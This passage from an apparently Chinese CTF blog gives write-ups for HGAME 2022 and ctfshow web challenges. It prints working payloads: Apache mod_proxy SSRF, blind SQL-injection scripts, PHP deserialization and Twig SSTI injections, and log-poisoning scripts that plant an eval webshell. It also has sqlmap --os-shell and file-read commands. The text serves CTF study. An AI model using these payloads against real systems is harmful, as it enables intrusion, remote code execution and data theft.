title="webpack-engine"></a>webpack-engine</h2><p>看源码<br><img src="https://img-blog.csdnimg.cn/8f3aea5f37794c06a1bf19699556d41e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="web-Apache"><a href="#web-Apache" class="headerlink" title="web Apache!"></a>web Apache!</h2><p>打开题目看源码发现附件<br>在Default.conf发现flag路径<br><img src="https://img-blog.csdnimg.cn/5f26a67b06754c38ae817ebed19c5591.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>本题考查CVE-2021-40438 Apache mod_proxy SSRF 漏洞<br>看详细资料<br><a href="https://www.anquanke.com/post/id/263175#h2-0">CVE-2021-40438 Apache mod_proxy SSRF 漏洞分析</a><br><a href="https://firzen.de/building-a-poc-for-cve-2021-40438">为 CVE-2021-40438 构建 POC</a><br><a href="https://www.anquanke.com/post/id/257657">Apache httpd Server CVE-2021-40438 漏洞分析</a><br><a href="https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html">Apache mod_proxy SSRF（CVE-2021-40438）的一点分析和延伸</a><br>从而得到路径</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /proxy?unix|http:<span class="comment">//127.0.0.1:60010/flag HTTP/1.1</span></span><br></pre></td></tr></table></figure><p>（由于我写的是都服务器似乎关闭了，因此没有得到flag）</p><h2 id="web-Pokemon"><a href="#web-Pokemon" class="headerlink" title="web Pokemon"></a>web Pokemon</h2><p>本题考查sql注入中的二分法盲注<br>过滤=用like绕过<br><a href="https://blog.csdn.net/weixin_39557087/article/details/113441010">mysql 注释 绕过_SQL注入绕过方法</a><br>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://121.43.141.153:60056/error.php?code=&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (head &lt; tail):</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = &quot;if(ascii(substr(database(),%d,1))&gt;%d,404,403)&quot; % (i , mid)</span></span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr((selselectect/*/**/*/flag/*/**/*/frfromom/*/**/*/fllllllllaaaaaag),%d,1))&gt;%d,404,403)&quot;</span> % (i, mid)</span><br><span class="line">        <span class="comment">#payload = &quot;if(ascii(substr((selselectect/*/**/*/group_concat(column_name)frfromom(infoorrmation_schema.columns)whwhereere(table_name/*/**/*/like/*/**/*/&#x27;fllllllllaaaaaag&#x27;)),%d,1))&gt;%d,404,403)&quot; % (i, mid)</span></span><br><span class="line"></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="comment">#r.encoding = &quot;utf-8&quot;</span></span><br><span class="line">        <span class="comment"># print(url+payload)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;404&quot;</span> in r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print(r.text)</span></span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    last = result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web-一本单词书"><a href="#web-一本单词书" class="headerlink" title="web 一本单词书"></a>web 一本单词书</h2><blockquote><p>substr(string,start,length)     substr() 函数返回字符串的一部分。<br>strstr() 函数搜索字符串在另一字符串中的第一次出现。<br>strpos() 函数查找字符串在另一字符串中第一次出现的位置。</p></blockquote><p>看源码，发现<a href="http://www.zip得压缩包/">www.zip得压缩包</a><br>下载得源码<br>在save.php中发现可以操作session文件<br><img src="https://img-blog.csdnimg.cn/5337af59de4a4effb4cd0550b4e71c58.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在get.php中发现可以进行反序列化<br><img src="https://img-blog.csdnimg.cn/fa09811a461d4b5f87eaf187fe213aa0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>由于数据处理时为json_decode所以键值对的键可控，注入session文件，反序列化读取文件<br>paylaod</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;y0ng|O:4:\&quot;Evil\&quot;:2:&#123;s:4:\&quot;file\&quot;;s:5:\&quot;/flag\&quot;;s:4:\&quot;flag\&quot;;N;&#125;&quot;</span>:<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web-SecurityCenter"><a href="#web-SecurityCenter" class="headerlink" title="web SecurityCenter"></a>web SecurityCenter</h2><p>看源码，发现<br><img src="https://img-blog.csdnimg.cn/6abe78c323dd475d850362ea85b14b90.png" alt="在这里插入图片描述"><br>进入之后发现是twig框架<br><img src="https://img-blog.csdnimg.cn/430d0333a13f4a8cb57a36010cc7d7d2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>扫目录发现<img src="https://img-blog.csdnimg.cn/b44ce02bf42847e1af810ec398b0cda4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>进入/redirect.php<br>发现存在ssti<br><img src="https://img-blog.csdnimg.cn/64e0d8978422400cbdd8f9a46dc503ae.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><a href="https://xz.aliyun.com/t/7518#toc-0">TWIG 全版本 通用 SSTI payload</a></p><p>利用上面得payload<br>得到题解</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=&#123;&#123;[<span class="string">&quot;base64+/f*&quot;</span>,%<span class="number">200</span>]|sort(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>直接/f*是无回显得<br>必须前面加上base64编码</p><h2 id="web-Vidar-shop-demo"><a href="#web-Vidar-shop-demo" class="headerlink" title="web Vidar shop demo"></a>web Vidar shop demo</h2><p>注册用户然后发现账户有9999元，商店里面flag需要1w<br>应该就是逻辑漏洞或者竞争，点击flag商品和其他一个商品进行下单<br>先把20的支付一下<br>发现之后还可以删除退钱<br>抓包<br>修改uid<br><img src="https://img-blog.csdnimg.cn/0612f31e309b4a78a149094a0003756e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现当点击删除时，发起一个对应ID的包，将id改为flag对应id 2637放包发现退还了1w，再次购买flag，成功<br><img src="https://img-blog.csdnimg.cn/29c35cb85bbd4fa5a2a1c981801caa51.png" alt="在这里插入图片描述"></p><h2 id="web-LoginMe"><a href="#web-LoginMe" class="headerlink" title="web LoginMe"></a>web LoginMe</h2><p>进入后直接尝试sqlmap发现可以使用<br>直接sqlmap一把梭<br><img src="https://img-blog.csdnimg.cn/34d90f8e73804038a70fc18f6fe9b813.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>得到密码登录得到flag</p><h2 id="web-Comment"><a href="#web-Comment" class="headerlink" title="web Comment"></a>web Comment</h2><p>打开题目，下载源码，发现<br><img src="https://img-blog.csdnimg.cn/9ac0941e667c4ef282f3c3de0c20314f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>libxml_disable_entity_loader(false); 允许外部实体，waf了一些关键字<br><img src="https://img-blog.csdnimg.cn/377dad0cdbde4c7bad5fd81c8e572d88.png" alt="在这里插入图片描述"><br>可以发现sender必须为admin，但是输入内容却不能有admin<br>尝试利用一百万个字符绕过preg_match，但是没成功<br>之后不会了！！！<br><strong>之后补上</strong></p><h2 id="web-Markdown-online"><a href="#web-Markdown-online" class="headerlink" title="web Markdown online"></a>web Markdown online</h2><p>下载附件<br>得到源码<br>看登录控制器<br><img src="https://img-blog.csdnimg.cn/89ddcc913ac34e02b2d7cb5c81f2abb2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>要使password长度为16且=54g<br>由于toUpperCase()函数使得字符都改为大写，则登录条件无法成立<br>但登录处只要让 toUpperCase 抛出异常就可以登陆成功，让password为数组即可使其长度为16绕过</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="attr">&quot;password&quot;</span>:[<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>]&#125;</span><br></pre></td></tr></table></figure><p>登陆后便不会了【哭笑】<br><a href="http://www.yongsheng.site/2022/02/17/HGAME%202022%20WEB/#more">第4周题目的大佬博客</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow 黑盒测试</title>
      <link href="/2022/01/15/ctfshow%20%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
      <url>/2022/01/15/ctfshow%20%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h2 id="黑盒测试简介"><a href="#黑盒测试简介" class="headerlink" title="黑盒测试简介"></a>黑盒测试简介</h2><blockquote><p>黑盒测试又称功能测试，是在不了解程序内部结构和内部特性的情况下进行的测试方法，黑盒测试只验证程序是否能按照需求规格说明书的规定正常使用，是否能适当的接收数据并给出适当的输出结果，如错误提示，或正确的界面等。</p></blockquote><p><a href="https://www.cnblogs.com/l199616j/p/11403666.html">黑盒测试详细简介</a></p><h2 id="web380"><a href="#web380" class="headerlink" title="web380"></a>web380</h2><p>打开后发现是一个网站，之后扫一下目录发现page.php下有东西打开<br>看到<br><img src="https://img-blog.csdnimg.cn/bc45b3f918fe41878e72fad9719a273e.png" alt="在这里插入图片描述"><br>于是payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/page.php?id=flag</span><br></pre></td></tr></table></figure><h2 id="web381"><a href="#web381" class="headerlink" title="web381"></a>web381</h2><p>看源码发现<br><img src="https://img-blog.csdnimg.cn/06100a50bcd040cfb55a0de607687548.png" alt="在这里插入图片描述"><br>它与其他的有差别，多了个文件夹，访问得到<br><img src="https://img-blog.csdnimg.cn/081e1a8e4d6e4b308ac9c898ffa7adb6.png" alt="在这里插入图片描述"></p><h2 id="web382、383"><a href="#web382、383" class="headerlink" title="web382、383"></a>web382、383</h2><p>和上一题一样，在相同的文件下，发现需要账号密码<br><img src="https://img-blog.csdnimg.cn/9cdc27d0198e417bb935e329ef9fbc25.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>利用万能密码得到flag</p><h2 id="web384"><a href="#web384" class="headerlink" title="web384"></a>web384</h2><p>和上面一样，进入目录后发现万能密码没用<br>看到提示<br><img src="https://img-blog.csdnimg.cn/62e4f12f2f9d4cdb85d55b78ca59e86b.png" alt="在这里插入图片描述"><br>想到爆破<br>利用脚本造出密码字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">s1=string.ascii_lowercase</span><br><span class="line">s2=string.digits</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;dict.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s1:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> s1:</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s2:</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> s2:</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> s2:</span><br><span class="line">p=i+j+k+l+m</span><br><span class="line">f.write(p+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>于是爆破<br>得到密码  xy123<br>得到flag</p><h2 id="web385"><a href="#web385" class="headerlink" title="web385"></a>web385</h2><p>本题先爆一下目录，发现/install目录存在<br>按照提示访问/install/?install<br>之后访问/alsckdfy，进行登录<br>发现账号密码不知道，于是sql注入<br>若是当前无法注入则前往382题注入获取初始账号密码<br>注入后发现密码为<br><img src="https://img-blog.csdnimg.cn/5e0ac41798a74c8c95c46ac9914803ea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_18,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>账号为admin<br>登录得到flag</p><h2 id="web386"><a href="#web386" class="headerlink" title="web386"></a>web386</h2><p>看到页面，先用工具扫目录，发现没扫出来，之后看大佬博客，发现具有<br>clear.php和install（扫描工具太菜！！！），通过分析，发现clear.php可以传参参数为file<br>(注意lock.dat在install下)<br>因此进行<br>?file=install/lock.dat<br><img src="https://img-blog.csdnimg.cn/021fb4446af342faade23895fa83ee5b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>或者可以在这里发现目录clear.php<br><img src="https://img-blog.csdnimg.cn/89d0af312bd14c14b60a8fffb449c2cf.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/96fa9ad559794b8b887b9fac7b22034a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="如图操作"></p><p>之后的步骤与上一题一样（访问install…….）</p><h2 id="web387"><a href="#web387" class="headerlink" title="web387"></a>web387</h2><p>打开题目，发现上一题思路都不行，之后进行尝试<br>得到<br><img src="https://img-blog.csdnimg.cn/e46e35b377664b25a6c0bd1cee9143c1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>访问/debug得到<br>通过？file传参看日志<br><img src="https://img-blog.csdnimg.cn/188a9c0dbd464c0a899ec4e5653c9860.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现可以访问，之后试一试一句话放在ua上进行传参，发现没有传参权限<br>看大佬博客，大佬是利用unlink函数将dat文件删掉<br>利用（写在ua中）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> unlink(<span class="string">&#x27;/var/www/html/install/lock.dat&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>之后访问日志后在访问install得到<br><img src="https://img-blog.csdnimg.cn/8036e79d6634491bba538ff7c22e33cc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>之后同上一样得到flag</p><h2 id="web388"><a href="#web388" class="headerlink" title="web388"></a>web388</h2><p>进入题目访问/alsckdfy/editor/<br>发现<br><img src="https://img-blog.csdnimg.cn/e3815dcc9d4d46c2a17e86a7ddb19344.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>由于kindEditor编辑4.1.11是存在上传过滤不严的漏洞的，可以上传txt或者zip文件。同时在、debug处存在包含漏洞<br>因此<br>上传文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;metsys&#x27;</span>;</span><br><span class="line"></span><br><span class="line">strrev(<span class="variable">$a</span>)(<span class="string">&#x27;echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+|base64 -d &gt; /var/www/html/1.php&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/4b356e0bba974a83b47ae70e6f26e5d6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>之后在debug处访问<img src="https://img-blog.csdnimg.cn/f98cf8f0c2b14ca7ada556df6833ac58.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>访问1.php得到shell<br><img src="https://img-blog.csdnimg.cn/b0a47a327e4545948eeb7106601f2a45.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>或用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&quot;http://fb707431-ebb7-41c8-9ce7-57da16163fec.chall.ctf.show/&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://fb707431-ebb7-41c8-9ce7-57da16163fec.chall.ctf.show/debug/?file=/var/log/nginx/access.log&quot;</span></span><br><span class="line">cmd=<span class="string">b&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span></span><br><span class="line">cmd=base64.b64encode(cmd).decode()</span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;&#x27;&#x27;&lt;?php system(&#x27;echo &#123;0&#125;|base64 -d  &gt; /var/www/html/b.php&#x27;);?&gt;&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(cmd)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(headers)</span><br><span class="line">requests.get(url=url,headers=headers)</span><br><span class="line">requests.get(url2)</span><br><span class="line"><span class="built_in">print</span>(requests.post(url+<span class="string">&#x27;b.php&#x27;</span>,data=&#123;<span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;system(&quot;cat alsckdfy/check.php&quot;);&#x27;</span>&#125;).text)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web389"><a href="#web389" class="headerlink" title="web389"></a>web389</h2><p>访问/debug发现没权限<br>抓包，发现具有jwt<br>修改jwt，改为admin，密钥为123456<br>将修改后的jwt放入cookie中，发现有权限了<br><img src="https://img-blog.csdnimg.cn/0e385a40fa1e4598a5a7a7b2599bb625.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>因此使用脚本（上题用第一种也行）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&quot;http://4c339478-478a-4112-9297-f8b173856bd3.challenge.ctf.show/&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://4c339478-478a-4112-9297-f8b173856bd3.challenge.ctf.show/debug/?file=/var/log/nginx/access.log&quot;</span></span><br><span class="line">cmd=<span class="string">b&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span></span><br><span class="line">cmd=base64.b64encode(cmd).decode()</span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;&#x27;&#x27;&lt;?php system(&#x27;echo &#123;0&#125;|base64 -d  &gt; /var/www/html/b.php&#x27;);?&gt;&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(cmd),</span><br><span class="line"><span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY0MTk5MzQ3NywiZXhwIjoxNjQyMDAwNjc3LCJuYmYiOjE2NDE5OTM0NzcsInN1YiI6ImFkbWluIiwianRpIjoiZTFhODc1NjdkNmYwM2Y5ZGQxNmZlODY2Nzg3ZDk3NmMifQ._Tsdmo_BZuW_pk7XsGTZO-eZwhCj8tc9v1STILqweoI&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(headers)</span><br><span class="line">requests.get(url=url,headers=headers)</span><br><span class="line">requests.get(url2,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(requests.post(url+<span class="string">&#x27;b.php&#x27;</span>,data=&#123;<span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;system(&quot;cat alsckdfy/check.php&quot;);&#x27;</span>&#125;,headers=headers).text)</span><br></pre></td></tr></table></figure><p>得到flag</p><h2 id="web390"><a href="#web390" class="headerlink" title="web390"></a>web390</h2><p>本题的page.php页面具有sql注入，利用sqlmap一把梭<br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="comment">//15f7f758-ad69-4efd-b54e-70b958779879.challenge.ctf.show/page.php?id=1 --file-read /var/www/html/alsckdfy/check.php --batch</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/a8b0184aa0f5463a8fbf0b5342fe8e06.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="web391"><a href="#web391" class="headerlink" title="web391"></a>web391</h2><p>本题page.php没有注入点，之后发现搜索框，试了一下，发现有注入点<br>同上<br><img src="https://img-blog.csdnimg.cn/247626191008497fa6fd0e4fc0343307.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="web392"><a href="#web392" class="headerlink" title="web392"></a>web392</h2><p>和上一题一样，在同一个位置存在sql注入，因此sql一把梭<br>（本题flag在/flag）<br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://64ef671c-b75d-4b18-9a9c-653012b494eb.challenge.ctf.show/search.php?title=s&quot;</span> --os-shell -batch </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/e83e33f403ef44b5b1df08c2ebc2e968.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="web393"><a href="#web393" class="headerlink" title="web393"></a>web393</h2><p>看到题目，用上面的方法，发现无法os 和读文件，因此尝试着爆库，之后发现在库中多出来个link表，看大佬博客，发现在主页面最下方发现过去没见过的搜索引擎<br><img src="https://img-blog.csdnimg.cn/71c1bc8ec57c4c40b61cc8c8614f9098.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>可以用sqlmap插入数据<br>并利用ssrf将/flag的文件写在数据库中，利用<br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://b3b129d6-b29a-413a-9bb1-b076712592de.challenge.ctf.show/search.php?title=1&#x27;;insert into link values(10,&#x27;a&#x27;,&#x27;file:///flag&#x27;);&quot;</span> -batch </span><br></pre></td></tr></table></figure><p>之后访问/link.php?id=10得到flag<br><img src="https://img-blog.csdnimg.cn/6deba91781224ee3aa20dd9904364077.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="web394、395"><a href="#web394、395" class="headerlink" title="web394、395"></a>web394、395</h2><p>打开本题，发现上题的思路还能用，因此进行测试，但显现虽然可以插入，但是没有回显，又测试check.php，发现报错。看大佬博客，发现过滤了字符<br>但是可以用16进制绕过，则payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://13eceab7-9766-4beb-9ff7-3ccf15085638.challenge.ctf.show/search.php?title=1&#x27;;insert into link values(10,&#x27;a&#x27;,0x66696c653a2f2f2f7661722f7777772f68746d6c2f616c73636b6466792f636865636b2e706870);&quot;</span> -batch</span><br></pre></td></tr></table></figure><p>本题的黑名单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file|check|php/i&#x27;</span>, <span 